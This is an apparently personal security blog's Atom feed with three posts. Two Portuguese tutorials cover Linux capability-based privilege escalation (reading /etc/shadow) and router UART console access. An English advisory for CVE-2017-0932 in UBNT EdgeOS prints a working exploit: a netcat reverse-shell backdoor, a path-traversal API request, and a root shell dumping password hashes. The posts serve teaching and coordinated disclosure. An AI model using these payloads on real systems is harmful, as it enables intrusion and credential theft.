<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-01-08T01:51:47-02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Maycon Vitali</title><subtitle>I hack stuff!</subtitle><author><name>Maycon Vitali</name></author><entry xml:lang="br"><title type="html">Hacking Tricks: Escalação de Privilégio em Linux com Capability</title><link href="http://localhost:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability.html" rel="alternate" type="text/html" title="Hacking Tricks: Escalação de Privilégio em Linux com Capability" /><published>2019-01-08T00:00:00-02:00</published><updated>2019-01-08T00:00:00-02:00</updated><id>http://localhost:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability</id><content type="html" xml:base="http://localhost:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability.html">&lt;p&gt;Dizem que quando você adentra em uma máquina seja durante um pentest, durante um estudo ou outra coisa (haha) você já pode ser considerado root/SYSTEM. Que mesmo estando com um usuários com pouco ou nenhum privilégio, existem diversas maneiras de se escalar para a autoridade máxima daquele host (sem entrar em detalhes pedantes). Essa escalação de privilégio pode ser feito através de vulnerabilidades no kernel, por falhas de aplicativos ou pelo simples desleixo/vacilo do sysadmin da rede. Com isso estou dando inicio a uma serie de &lt;em&gt;hacking tricks&lt;/em&gt; que são utilizados em pentests, competições de CTF etc. E a primeira publicação será sobre escalação de privilégios com &lt;em&gt;Linux Capabilities&lt;/em&gt;. Boa leitura!&lt;/p&gt;

&lt;h3 id=&quot;o-que-são-capabilities&quot;&gt;O que são &lt;em&gt;capabilities&lt;/em&gt;&lt;/h3&gt;

&lt;p&gt;Existem basicamente dois tipos de privilégios de processos em um sistema Linux, os processos privilegiados, com &lt;em&gt;user id 0 (root)&lt;/em&gt;, e os processos não privilegiados, com &lt;em&gt;user id&lt;/em&gt; diferente de zero. Processos privilegiados conseguem bypassar todas as checagens de permissões do kernel enquanto os processos não root precisa que todo e qualquer recursos que ele for acessar seja validado.&lt;/p&gt;

&lt;p&gt;A partir do kernel 2.2 (sim, a muito tempo atrás), o Linux introduziu uma outra divisão de privilégios além das permissões do processo, essas podendo ser ativadas ou desativadas independente. Essa divisão de privilégios chama-se &lt;em&gt;capabilities&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&quot;como-funciona&quot;&gt;Como funciona?&lt;/h3&gt;

&lt;p&gt;Para o resito de escalação de privilégio, podemos iniciar enumerando todas as &lt;em&gt;capabilities&lt;/em&gt; disponível no sistema. Isso é feito através do comando &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt;, que pode ser executado para buscar de maneira recursiva (&lt;code class=&quot;highlighter-rouge&quot;&gt;-r&lt;/code&gt;) a partir da raiz (&lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;) do sistema de arquivos:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ /sbin/getcap -r / 2&amp;gt;/dev/null
/usr/bin/rsh = cap_net_bind_service+ep
/usr/bin/rlogin = cap_net_bind_service+ep
/usr/bin/dumpcap = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/cat = cap_dac_read_search+ei
/usr/bin/ping = cap_net_raw+ep
/usr/bin/rcp = cap_net_bind_service+ep
/usr/lib/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nota-se que antes o binário &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt;, que geralmente era &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt;, hoje ainda pertence ao &lt;em&gt;root&lt;/em&gt;, porém sem o &lt;em&gt;suid bit&lt;/em&gt; habilitado:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CAP_NET_RAW
      * Use RAW and PACKET sockets;
      * bind to any address for transparent proxying.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;O que faz com que esse binário seja possível montar e enviar pacotes &lt;em&gt;raw&lt;/em&gt; na rede é a &lt;em&gt;capability&lt;/em&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_net_raw&lt;/code&gt;, como podemos ver na &lt;em&gt;man page&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ ls -la /usr/bin/ping
-rwxr-xr-x 1 root 60112 Jul 12 01:52 /usr/bin/ping
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Um outro exemplo é o &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/dumpcap&lt;/code&gt;, que é utilizado pelo &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt;. Essa aplicação que valida se o usuário pertence ao grupo &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; para, então, permitir que o mesmo capture o tráfego de rede sem precisar do &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; ou de escalar para &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Na listagem acima é possível notar que temos o &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/cat&lt;/code&gt; com a &lt;code class=&quot;highlighter-rouge&quot;&gt;capability cap_dac_read_search&lt;/code&gt;. Para garantir o entendimento desse atributo, vamos ver o que a &lt;em&gt;man page&lt;/em&gt; diz sobre ele:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CAP_DAC_READ_SEARCH
      * Bypass file read permission checks and directory read and
        execute permission checks;
      * invoke open_by_handle_at(2);
      * use the linkat(2) AT_EMPTY_PATH flag to create a link to a
        file referred to by a file descriptor.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como pode ser visto, temos uma falha de segurança, pois o &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; possui a &lt;em&gt;capability&lt;/em&gt; de &lt;em&gt;bypassar&lt;/em&gt; a checagem de permissão de leitura feita pelo kernel. Dessa forma mesmo sem &lt;code class=&quot;highlighter-rouge&quot;&gt;suid bit&lt;/code&gt; ou sem ser &lt;em&gt;root&lt;/em&gt; é possível ler qualquer arquivo utilizando o mesmo:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ cat /etc/shadow | grep root
root:$6$X.E.toNpWI9G4IL3$8gwwSdv...snip...Ky1duJ9xP6c94Lg.:17870::::::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;É claro que o &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; foi posto de maneira proposital para exemplificar. Porém as capabilities do &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/dumpcap&lt;/code&gt;, por exemplo, são padrões nos ambientes que possuem &lt;em&gt;wireshark&lt;/em&gt; instalado (eg: Kali Linux). Então fica como exercício para casa descobrir uma forma de escalar privilégio em ambientes cujo seu usuário é não privilegiado e está no grupo &lt;em&gt;wireshark&lt;/em&gt; (hint: &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_dac_override&lt;/code&gt; vai te ajudar).&lt;/p&gt;

&lt;h3 id=&quot;conclusão&quot;&gt;Conclusão&lt;/h3&gt;

&lt;p&gt;Essa foi uma escrita rápida para demonstrar uma forma bem interessante de escalar privilégio em sistemas Linux. Espero poder ter tempo para escrever outros &lt;em&gt;hacking tricks&lt;/em&gt; e contribuir de alguma forma com quem está iniciando. Quem quiser brincar mais com isso basta ler a &lt;em&gt;man page&lt;/em&gt;  e utilizar os comandos &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt; e &lt;code class=&quot;highlighter-rouge&quot;&gt;setcap&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para dúvidas, sugestões ou reclamações basta utilizar o espaço de comentários abaixo ou os contatos disponíveis na barra lateral do site.&lt;/p&gt;

&lt;p&gt;Hack N’ Roll&lt;/p&gt;

&lt;h3 id=&quot;referências&quot;&gt;Referências&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;man 7 capabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="hacking-tricks" /><category term="privilege-escalation" /><category term="linux" /><category term="capability" /><summary type="html">Dizem que quando você adentra em uma máquina seja durante um pentest, durante um estudo ou outra coisa (haha) você já pode ser considerado root/SYSTEM. Que mesmo estando com um usuários com pouco ou nenhum privilégio, existem diversas maneiras de se escalar para a autoridade máxima daquele host (sem entrar em detalhes pedantes). Essa escalação de privilégio pode ser feito através de vulnerabilidades no kernel, por falhas de aplicativos ou pelo simples desleixo/vacilo do sysadmin da rede. Com isso estou dando inicio a uma serie de hacking tricks que são utilizados em pentests, competições de CTF etc. E a primeira publicação será sobre escalação de privilégios com Linux Capabilities. Boa leitura!</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Acessando a interface UART/Serial</title><link href="http://localhost:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART.html" rel="alternate" type="text/html" title="Embedded Hacking: Acessando a interface UART/Serial" /><published>2018-03-10T00:00:00-03:00</published><updated>2018-03-10T00:00:00-03:00</updated><id>http://localhost:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART</id><content type="html" xml:base="http://localhost:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART.html">&lt;p&gt;Na última publicação foi falado sobre uma forma de se iniciar o processo de análise dinâmica de alguns binários utilizando o qemu. A principal vantagem dessa técnica é a possibilidade de conseguir dinamicamente analisar alguns binários sem a necessidade de possuir o hardware em mãos. Porém, tendo o hardware em mãos, muitas vezes é possível identificar uma interface serial no dispositivo, que resulta praticamente no acesso a um console do dispositivo. Nessa publicação será explicado como podemos identificar e acessar essa interface serial presente em praticamente todos os dispositivos embarcados.&lt;/p&gt;

&lt;h3 id=&quot;a-interface-uart&quot;&gt;A interface UART&lt;/h3&gt;

&lt;p&gt;A interface UART (Universal Asynchronous Receiver-Transmitter), comumente encontrada em dispositivos embarcados, consiste em um hardware que fornece uma interface serial de comunicação assíncrona, e seu principal objetivo é fornecer um mecanismo de análise e depuração do dispositivo. Atualmente essa interface já é implementada em microcontroladores e microprocessadores, e é ferramenta fundamental para a engenharia reversa do dispositivo, por fornecer um acesso dinâmico ao dispositivo.&lt;/p&gt;

&lt;p&gt;Geralmente a interface UART é identificada na placa do dispositivo com 4 conectores. Esses conectores podem estar com pinos, o que facilita bastante o trabalho, porém algumas vezes será necessário soltar ou prender pinos à placa para se ter uma forma de usar a conexão. Em alguns casos esses conectores sequer estão próximos um do outros, tornando necessário uma análise mais minuciosa da placa para identificá-los.&lt;/p&gt;

&lt;h3 id=&quot;o-console-serial-linux&quot;&gt;O Console Serial Linux&lt;/h3&gt;

&lt;p&gt;Quem já foi usuário de distribuições GNU/Linux ditas mais hards (Slackware, Gentoo, ArchLinux etc) provavelmente já é familiarizando com editar a configuração do bootloaders (grub ou Lilo) e alterar parâmetros da linha de comando da inicialização do Kernel. Um desses parâmetros do kernel diz respeito ao &lt;a href=&quot;https://www.kernel.org/doc/html/v4.12/admin-guide/serial-console.html&quot;&gt;Serial Console&lt;/a&gt; e, por não termos muitas alternativas de baixo custo, praticamente todo dispositivo embarcado possui essa configuração habilitada por padrão.&lt;/p&gt;

&lt;p&gt;O console serial é responsável por redirecionar as mensagens do Kernel (que ficariam sendo exibidas em um monitor, por exemplo) para a saída serial. A partir daí é possível plugar um dispositivo serial na outra ponta e, sem muita dificuldade, visualizar e interagir com o console do Linux (shell) em tempo real, em execução no dispositivo ligado. Quando passamos esse parâmetro para o Kernel, é necessário fornecer o dispositivo do console que será utilizado (por exemplo o /dev/console) e o baudrate de transmissão. Caso esses parâmetros não sejam especificados, o Kernel irá utilizar o primeiro dispositivo disponível capaz de fornecer uma interface serial, e o baudrate de 9600n8, que significa uma transmissão de 9600bps (sim, bits por segundo), com 8 bits de dado e sem bit de paridade.&lt;/p&gt;

&lt;h3 id=&quot;identificação-da-pinagem&quot;&gt;Identificação da Pinagem&lt;/h3&gt;

&lt;p&gt;Para se identificar a pinagem do dispositivo temos que primeiramente abri-lo. Dependendo da criticidade do dispositivo que você está analisando, talvez exista técnicas anti-tampering, que detecta a abertura e destrói qualquer informação sensível ou relevante no dispositivo, impossibilitando a análise. Porém, devido ao custo de se empregar isso em larga escala, essas técnicas só são aplicadas em dispositivos críticos que armazenam dados sensíveis, como máquinas de cartão de crédito. Quem sabe em um futuro não muito próximo eu entre mais a fundo nesse assunto. Entretanto, caso o dispositivo analisado seja um roteador doméstico (semelhante ao que tenho utilizado nessa série de tutoriais), é praticamente impossível que existam tais técnicas de proteção implementadas. Então podemos abri-lo sem medo.&lt;/p&gt;

&lt;p&gt;Como eu havia falado, a interface UART geralmente é composta por 4 pinos, então abrir o dispositivo procure por 4 conectores próximos um ao outro. Caso você tenha sorte, esses conectores serão facilmente achados e já com os pinos disponíveis, sem necessitar soldar. Esses pinos são (não respectivamente):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;VCC&lt;/strong&gt;: Uma fonte de alimentação (geralmente 3.3V ou 5V).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;TX&lt;/strong&gt;: Pino de transmissão de dados.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;RX&lt;/strong&gt;: Pino de recepção de dados&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;GND&lt;/strong&gt;: Aterramento (ground).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;No equipamento que tenho utilizado para escrever essa série de publicações (o &lt;em&gt;MitraStar DSL-100HN-T1-NV&lt;/em&gt;) esses pinos foram facilmente identificados e, para minha sorte, os mesmos já estava disponível com toda a pinagem disponível, sem existir a necessidade de se soldar os pinos à placa.&lt;/p&gt;

&lt;p&gt;Abaixo é possível ter uma visão da placa interna do modem:
&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/03/vivo-board.jpg&quot; alt=&quot;DSL-100HN-T1-NV - Placa Interna&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Reparem que, apesar de existirem 5 conectores próximos um do outro, somente 4 deles possuem pinos para conexão. O quinto conector poderia ser parte da interface UART, porém obviamente testei primeiro os 4 com pinos disponíveis e, como de imaginar, foi suficiente para acessar a interface serial do dispositivo.&lt;/p&gt;

&lt;h4 id=&quot;detectando-a-pinagem&quot;&gt;Detectando a Pinagem&lt;/h4&gt;

&lt;p&gt;Agora que já temos o candidato a possível interface UART identificada, precisamos detectar quem é quem (&lt;strong&gt;RX&lt;/strong&gt;, &lt;strong&gt;TX&lt;/strong&gt;, &lt;strong&gt;VCC&lt;/strong&gt; e &lt;strong&gt;GND&lt;/strong&gt;). Para isso vamos utilizar um multímetro.&lt;/p&gt;

&lt;p&gt;Os principais a identificarmos são o &lt;strong&gt;VCC&lt;/strong&gt; e o &lt;strong&gt;GND&lt;/strong&gt;, pois a ordem do &lt;strong&gt;TX&lt;/strong&gt; e do &lt;strong&gt;RX&lt;/strong&gt; não corre o risco de danificar o aparelho. Já se invertermos VCC ou GND ou ligarmos alguma coisa errada nesses pinos podemos não só danificar nossa placa, como podemos danificar o dispositivo conversor para USB que utilizaremos ou, até mesmo, a controladora USB da máquina que utilizamos para os testes.&lt;/p&gt;

&lt;p&gt;Ai ligar o equipamento, o processo de boot carrega todas as mensagens do Kernel, enviando uma quantidade grande dados para o bit de transmissão &lt;strong&gt;TX&lt;/strong&gt;. Caso o multímetro não consiga identificar essa oscilação, talvez o resultado confunda o pino de &lt;strong&gt;TX&lt;/strong&gt; com o pino de &lt;strong&gt;VCC&lt;/strong&gt;, e isso não seria agradável. Portanto uma alternativa que eu utilizo é esperar o equipamento terminar o processo de boot e então medir a tensão em cada um dos pinos. Dessa forma os pinos que não são o VCC ficarão com uma tensão baixa (ou zero) e o VCC fornecerá uma tensão contínua de 3.3V ou 5V.&lt;/p&gt;

&lt;p&gt;Tendo identificado o pino de VCC, não existe mais muito risco em confundir os demais pinos. Com isso podemos simplesmente utilizar o multímetro para identificar o pino de aterramento(0V), e podemos utilizar tentativa e erro para identificar quem é RX e quem é TX, apesar de que durante o processo de boot recebemos várias informações em &lt;strong&gt;TX&lt;/strong&gt; e praticamente nada em &lt;strong&gt;RX&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;conectamos-os-pinos&quot;&gt;Conectamos os Pinos&lt;/h3&gt;

&lt;p&gt;O próximo passo após identificar a pinagem UART na placa do dispositivo embarcado é ligá-la corretamente a um computador para que possamos acessar a interface serial. Para isso podemos utilizar um simples conversor USB/Serial, que é super barato mesmo comprando no &lt;a href=&quot;https://eletronicos.mercadolivre.com.br/pecas-componentes-eletricos/conversor-usb-serial-ttl&quot;&gt;Mercado Livre&lt;/a&gt;. Esses conversores possuem preços a partir de R$ 8,00, o que o torna acessível para a maioria das pessoas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/03/conversor-usb-ttl.png&quot; alt=&quot;Conversor USB-TTL&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para fazer a ligação, iremos utilizar TRÊS dos QUATRO pinos detectados anteriormente. É importante relembrar que NÃO UTILIZAREMOS a pinagem VCC em momento algum para acessar a interface UART do dispositivo. Se por acaso você ligar o VCC da sua placa com o VCC do conversor, lembre-se que ambas estão FORNECENDO corrente e, por isso, o resultado não será agradável. Dito isso, a ligação deve ser feita da seguinte forma:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pino de transmissão (TX) do dispositivo ligado no pino de recepção (RX) do conversor&lt;/li&gt;
  &lt;li&gt;Pino de recepção (RX) do dispositivo ligado no pino de transmissão (TX) do conversor&lt;/li&gt;
  &lt;li&gt;Pino de aterramento (GND) do dispositivo ligado no pino de aterramento (GND) do conversor&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Com isso teremos uma ligação semelhante ao demostrado na figura abaixo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/03/conexao-uart.jpg&quot; alt=&quot;Conversor USB-TTL&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;detecção-do-baudrate&quot;&gt;Detecção do Baudrate&lt;/h3&gt;

&lt;p&gt;Como eu havia comentado, existe um baudrate padrão definido pelo Kernel, porém caso não seja esse o especificado, será necessário descobrir qual é o utilizado.&lt;/p&gt;

&lt;p&gt;Não existe uma gama imensa possíveis baudrates utilizados por padrão nos dispositivos. Na verdade, os baudrates geralmente é um dos cinco seguintes: 9600, 38400, 19200, 57600 e 115200. Portanto você pode tentar um por vez ou simplesmente utilizar o script &lt;a href=&quot;https://github.com/devttys0/baudrate/&quot;&gt;Baudrate&lt;/a&gt;, desenvolvida pelo pessoal do &lt;a href=&quot;http://www.devttys0.com/&quot;&gt;devttys0&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Como a interface UART não possui um clock para sincronizar a transmissão/recepção de dados, os dados (bytes ou caracteres) são identificados a partir do baudrate. Portanto se você fornecer um baudrate incorreto os bits serão agrupados de maneira incorreta e o resultado será um monte de lixo ilegível na tela. Caso seja fornecido um baudrate correto, os bits serão agrupados corretamente e será exibido as mensagens do Kernel para o console.&lt;/p&gt;

&lt;h3 id=&quot;acessando-o-console&quot;&gt;Acessando o Console&lt;/h3&gt;

&lt;p&gt;Tendo tudo verificado e conectado, agora basta acessar a interface fornecida pelo conversor serial e acessar o console do dispositivo embarcado. Esse acesso pode ser feito pela aplicação &lt;a href=&quot;https://en.wikipedia.org/wiki/Minicom&quot;&gt;minicom&lt;/a&gt; ou, se preferir, pode utilizar a própria ferramenta &lt;a href=&quot;https://www.gnu.org/software/screen/&quot;&gt;GNU Screen&lt;/a&gt; para acessar tal interface. Ambos são disponíveis em praticamente todas os repositórios oficiais das distribuições Linux. Para amantes do Windows, o acesso pode ser feito pelo [g]old HyperTerminal ou, se preferir, pela ferramenta Putty, mas como fazer isso fica ao encargo e cada um.&lt;/p&gt;

&lt;p&gt;Após conectar o screen na interface serial e ligar o dispositivo, caso tudo esteja corretamente configurado, será possível visualizar o processo de boot desde o kernel até a shell Linux. Abaixo é possível visualizar o resultado do boot do &lt;em&gt;MitraStar DSL-100HN-T1-NV&lt;/em&gt; através da interface serial:&lt;/p&gt;

&lt;asciinema-player src=&quot;/assets/cast/DSL-100HN-T1-NV-boot.json&quot; preload=&quot;true&quot; rows=&quot;25&quot; cols=&quot;100&quot; poster=&quot;npt:0:11&quot;&gt;&lt;/asciinema-player&gt;

&lt;p&gt;Só a mensagem de boot acima fornece diversas informações úteis para análise futuras (inclusive um &lt;em&gt;Segmentation Fault&lt;/em&gt;). Alguns dispositivos já fornecem diretamente uma shell root, outros permitem login utilizando as mesmas credenciais da interface web, alguns possuem senhas hardcoded que podem ser obtidas através da &lt;a href=&quot;/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html&quot;&gt;extração do firmware&lt;/a&gt; etc; cada caso é um caso. Mas, como de praxe, isso ficará para postagens futuras.&lt;/p&gt;

&lt;h3 id=&quot;conclusão&quot;&gt;Conclusão&lt;/h3&gt;

&lt;p&gt;Com esta publicação acredito eu que se encerra as etapas fundamentais para análise tanto estática quanto dinâmica de dispositivos embarcados. A partir das próximas publicações teremos algo bem específico do dispositivo em questão e, é claro, iremos cada vez mais descer o nível de profundidade em nossas análises.&lt;/p&gt;

&lt;p&gt;Espero que quem está acompanhando a série esteja gostando. E caso tenham alguma dúvida ou sugestão basta utilizar os campos de comentários abaixo ou entrar em contato diretamente comigo pelos meios de contato na barra lateral.&lt;/p&gt;

&lt;p&gt;Cheers,&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="uart" /><category term="serial" /><summary type="html">Na última publicação foi falado sobre uma forma de se iniciar o processo de análise dinâmica de alguns binários utilizando o qemu. A principal vantagem dessa técnica é a possibilidade de conseguir dinamicamente analisar alguns binários sem a necessidade de possuir o hardware em mãos. Porém, tendo o hardware em mãos, muitas vezes é possível identificar uma interface serial no dispositivo, que resulta praticamente no acesso a um console do dispositivo. Nessa publicação será explicado como podemos identificar e acessar essa interface serial presente em praticamente todos os dispositivos embarcados.</summary></entry><entry xml:lang="en"><title type="html">UBNT EdgeOS &amp;lt;= v1.9.1.1 Local Privilege Escalation</title><link href="http://localhost:4000/advisories/2018/03/05/CVE-2017-0932.html" rel="alternate" type="text/html" title="UBNT EdgeOS &lt;= v1.9.1.1 Local Privilege Escalation" /><published>2018-03-05T00:00:00-03:00</published><updated>2018-03-05T00:00:00-03:00</updated><id>http://localhost:4000/advisories/2018/03/05/CVE-2017-0932</id><content type="html" xml:base="http://localhost:4000/advisories/2018/03/05/CVE-2017-0932.html">&lt;p&gt;UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Vendor: Ubiquiti Networks&lt;/li&gt;
  &lt;li&gt;Device: Edger Router X&lt;/li&gt;
  &lt;li&gt;Affected Version: 1.9.1.1 and prior&lt;/li&gt;
  &lt;li&gt;CVE-ID: CVE-2017-0932&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;details&quot;&gt;Details&lt;/h3&gt;

&lt;p&gt;The EdgeOS (firmware v1.9.1.1) is susceptible to a local privilege escalation due a Path Traversal vulnerability in the Feature API. This vulnerability allows an attacker with non-privileged access (read-only) to execute commands on the device with the root rights. The attack consists in sending a maliciously crafted file (using scp with a non-privileged account) to the device and then calling the vulnerable API exploiting the Path Traversal. The exploitation will result on the crafted file being executed with root permission, giving the attacker full access to the device.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;

&lt;p&gt;First of all, we have to create the following file+directory:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat Backdoor/wizard-run
#!/bin/bash
/usr/bin/nc 192.168.2.2:1337 -e /bin/bash &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using a non-privileged ‘operator’ user, it was possible to upload the file to the device using the scp command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ scp -r Backdoor operator@192.168.2.1:~
Welcome to EdgeOS

By logging in, accessing, or using the Ubiquiti product, you
acknowledge that you have read and understood the Ubiquiti
License Agreement (available in the Web UI at, by default,
http://192.168.1.1) and agree to be bound by its terms.

operator@192.168.2.1's password: 
wizard-run       
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that, using a valid operator session and a path traversal vulnerability, it was possible to call the uploaded file with root privilege:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /api/edge/feature.json HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: https://192.168.2.1/
Content-Type: application/json
X-CSRF-TOKEN: 4310724fdcab5474ab225a105bd6f86d43247dbaf5b7f4aa2ec329a641ec55ec
X-Requested-With: XMLHttpRequest
Content-Length: 90
Cookie: ip_address_top_user_option=total_bytes; PHPSESSID=i6um09hej0ku2k5ctcp6ib56f1nrqhi7; X-CSRF-TOKEN=4310724fdcab5474ab225a105bd6f86d43247dbaf5b7f4aa2ec329a641ec55ec
Connection: close

{&quot;data&quot;:{&quot;scenario&quot;:&quot;../../../../../home/operator/Backdoor&quot;,&quot;action&quot;:&quot;load&quot;}}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And a remote shell will be created:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from 192.168.2.1 44440 received!
id
uid=0(root) gid=102(vyattacfg)
uname -a
Linux ubnt 3.10.14-UBNT #1 SMP Sat Apr 22 06:38:07 PDT 2017 mips GNU/Linux
cat /etc/shadow
root:!:17283:0:99999:7:::
daemon:*:17283:0:99999:7:::
bin:*:17283:0:99999:7:::
games:*:17283:0:99999:7:::
.. snip snip ..
avahi:*:17283:0:99999:7:::
sshd:*:17283:0:99999:7:::
tss:*:17283:0:99999:7:::
ubnt:$1$zKNoUbAo$gomzUbYvgyUMcD436Wo66.:16436:0:99999:7:::
operator:$6$7SVNi.WB68V0QR5t$efMoCyT2H.mEU6M8s2NDSsW1fv7JnT2eAfK2VxuzsIdcYrEvWCILX8G0CYN/4enwrnT1yYjekQa95TxxHxhVj.:16436:0:99999:7:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;recommendation&quot;&gt;Recommendation&lt;/h3&gt;

&lt;p&gt;Upgrade the firmware to the latest available version.&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;2017-06-14 - Vulnerability discovered and first report to Ubiquiti Networks&lt;/li&gt;
  &lt;li&gt;2017-06-14 - UBNT anwsered and confirmed the vulnerability&lt;/li&gt;
  &lt;li&gt;2017-06-14 - Ubiquiti Networks rewarded with a $1,500 bounty&lt;/li&gt;
  &lt;li&gt;2017-08-30 - Ubiquiti Networks fixed the vulnerability&lt;/li&gt;
  &lt;li&gt;2017-11-24 - Ubiquiti Networks agreed with a partial disclosure of the vulnerability&lt;/li&gt;
  &lt;li&gt;2018-03-05 - Disclosure of technical details&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://maycon.hacknroll.io/advisories/2018/03/05/CVE-2017-0932.html&quot;&gt;Maycon’s Page&lt;/a&gt;&lt;/li&gt;
